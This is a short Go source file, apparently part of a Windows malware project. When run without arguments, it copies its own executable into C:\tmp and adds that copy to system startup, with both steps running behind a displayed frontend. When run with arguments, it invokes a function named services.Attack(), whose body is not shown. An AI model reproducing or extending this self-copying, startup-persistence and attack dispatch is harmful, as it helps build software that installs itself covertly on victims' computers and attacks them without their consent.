package frontend

import (
	"fmt"
	"log"
	"main/services"
	"main/utils"
	"os"
	"sync"
)

const ExeFileLocation = ".\\main.exe"

func Parse(args []string) {

	if len(args) == 1 {
		var wg sync.WaitGroup
		oldLocation := ExeFileLocation
		newLocation := "C:\\tmp"
		if _, err := os.Stat(newLocation); os.IsNotExist(err) {
			err := os.Mkdir(newLocation, 0666)
			if err != nil {
				log.Fatal("Cannot create temp file")
			}
		}
		file, err := utils.CopyFile(oldLocation, newLocation, utils.FILENAME)
		if err != nil {
			log.Fatal(err)
		}

		wg.Add(1)
		go func() {
			defer wg.Done()
			err = utils.AddToStartup(file)
			if err != nil {
				log.Fatal(err)
			}
		}()
		wg.Add(1)
		go DisplayFrontend(&wg)
		wg.Wait()

		displayExitMessage()
	} else {
		services.Attack()
	}
}

func displayExitMessage() {
	var x string
	fmt.Println("Press enter to exit please...")
	fmt.Scanln(&x)
}
